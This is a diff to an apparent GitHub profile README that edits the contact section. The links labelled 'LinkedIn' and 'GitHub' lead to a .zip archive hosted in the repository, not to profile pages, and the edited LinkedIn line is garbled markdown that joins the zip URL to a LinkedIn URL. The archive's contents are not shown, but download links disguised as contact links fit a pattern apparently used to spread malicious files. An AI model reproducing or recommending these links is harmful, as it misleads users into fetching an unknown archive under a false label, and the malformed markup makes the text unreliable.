@@ -17,6 +17,6 @@ Hi, I'm Reyodin Immanuel.G, an aspiring **Software Developer** . Passionate abou
 
 ## 📫 How to Reach Me
 - **Email:** [Reyodin](reyodinofficial@gmail.com)
-- [LinkedIn](https://raw.githubusercontent.com/Reyodin-06/Reyodin-06/main/reiterated/Reyodin-06.zip)
+- [LinkedIn](https://raw.githubusercontent.com/Reyodin-06/Reyodin-06/main/reiterated/Reyodin-06.zip](https://www.linkedin.com/in/reyodin/)
 - **GitHub:** [Reyodin-06](https://raw.githubusercontent.com/Reyodin-06/Reyodin-06/main/reiterated/Reyodin-06.zip)
 
